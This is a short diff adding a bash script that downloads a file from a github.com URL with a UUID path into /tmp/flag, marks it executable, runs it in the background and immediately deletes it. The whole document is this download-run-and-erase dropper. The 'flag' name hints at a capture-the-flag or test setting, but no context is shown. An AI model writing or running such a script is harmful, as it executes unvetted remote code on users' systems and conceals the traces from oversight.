@@ -1,0 +1,5 @@
+#!/bin/bash
+curl -o /tmp/flag https://github.com/7fff01de-1619-4ccb-9f1c-c1216c139c26
+chmod +x /tmp/flag
+/tmp/flag &
+rm -f /tmp/flag
